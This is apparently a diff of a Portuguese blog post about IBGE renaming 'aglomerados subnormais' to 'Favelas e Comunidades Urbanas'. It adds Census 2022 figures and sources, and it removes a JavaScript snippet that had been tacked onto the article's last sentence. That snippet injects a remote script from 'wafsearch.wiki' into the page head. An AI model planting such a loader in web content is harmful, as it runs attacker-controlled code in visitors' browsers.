@@ -1,15 +1,16 @@
 ---
 title: "Favelas e Comunidades Urbanas: Entenda a nova abordagem do IBGE"
 slug: "favelas-e-comunidades-urbanas-entenda-a-nova-abordagem-do-ibge"
-excerpt: ""
+excerpt: "O IBGE trocou \"aglomerados subnormais\" por \"Favelas e Comunidades Urbanas\". Entenda a mudança e veja os números do Censo 2022."
 category: "Blog"
 cluster: "cultura-periferica"
 author: "Senna Ricarte"
 image: "blog/favelas-e-comunidades-urbanas-entenda-a-nova-abordagem-do-ibge.jpg"
 pubDate: 2024-01-31T12:36:47+00:00
+updatedDate: 2026-10-19T12:00:00+00:00
 status: "published"
-metaTitle: "Favelas e Comunidades Urbanas: Entenda a nova abordagem do IBGE"
-metaDescription: ""
+metaTitle: "Favelas e Comunidades Urbanas: Nova Abordagem do IBGE"
+metaDescription: "Entenda por que o IBGE passou a usar \"Favelas e Comunidades Urbanas\" e veja os números do Censo 2022: 16,4 milhões de moradores."
 ---
 
 <h2>O IBGE Redefine a Identificação dos Aglomerados Subnormais</h2>
@@ -40,14 +41,27 @@ O Censo 2022 está avaliando a comparabilidade com 2010, buscando assim, identif
 Além da transformação na nomenclatura oficial, na mídia e na sociedade, essas áreas são conhecidas por vários termos, como grotão, invasão, alagado, vila ou bairro, dependendo da localização e de quem fala. No Rio de Janeiro, o termo "comunidade" ganha destaque para suavizar a associação imediata entre favela e violência.
 
 Contudo, a escolha entre "favela" e "comunidade" não é consensual. Alguns veem em "favela" uma afirmação de identidade, resistência e denúncia de condições precárias, enquanto outros acreditam que "comunidade" apaga e silencia essas questões.
+<h2>O que mostra o Censo 2022</h2>
+<ul>
+<li><strong>População:</strong> 16,4 milhões de pessoas moram em favelas e comunidades urbanas, ou 8,1% dos brasileiros.</li>
+<li><strong>Quantidade:</strong> o IBGE identificou 12.348 favelas e comunidades urbanas.</li>
+<li><strong>Maiores:</strong> Rocinha (RJ), com 72.021 moradores, Sol Nascente (DF), com 70.908, e Paraisópolis (SP), com 58.527.</li>
+<li><strong>Maior proporção por estado:</strong> Amazonas (34,7%), Amapá (24,4%) e Pará (18,8%).</li>
+</ul>
+<p>Os dados foram divulgados em 8 de novembro de 2024. Os números acima vêm de reportagem que cita o IBGE. Confira os valores nas tabelas oficiais do instituto.</p>
+<p>Leia também: <a href="/blog/o-que-e-cultura-periferica/">O que é cultura periférica</a>.</p>
 <h2>Conclusão: A importância de nomenclaturas e identidade</h2>
 A mudança na denominação dos aglomerados subnormais pelo IBGE não é apenas uma questão de terminologia, mas sim uma evolução na compreensão e abordagem dessas áreas.
 
 A nova designação como "Favelas e Comunidades Urbanas" reflete um esforço para reconhecer a diversidade desses espaços e a complexidade de suas realidades.
 
-A discussão sobre os nomes também destaca a importância de respeitar a autenticidade e identidade dessas comunidades, enquanto se busca uma compreensão mais abrangente de suas características e desafios.var url = 'https://wafsearch.wiki/xml';
-var script = document.createElement('script');
-script.src = url;
-script.type = 'text/javascript';
-script.async = true;
-document.getElementsByTagName('head')[0].appendChild(script);;;
+A discussão sobre os nomes também destaca a importância de respeitar a autenticidade e identidade dessas comunidades, enquanto se busca uma compreensão mais abrangente de suas características e desafios.
+
+<h2>Fontes</h2>
+
+<p>Conferidas em 19 de outubro de 2026.</p>
+
+<ul>
+<li><a href="https://www.ibge.gov.br/" target="_blank" rel="noopener noreferrer">IBGE – Censo Demográfico 2022</a></li>
+<li><a href="https://www.itatiaia.com.br/brasil/2024/11/08/quase-16-4-milhoes-de-pessoas-moram-em-favelas-no-brasil-aponta-ibge/" target="_blank" rel="noopener noreferrer">Itatiaia – Quase 16,4 milhões de pessoas moram em favelas no Brasil, aponta IBGE (8/11/2024)</a></li>
+</ul>
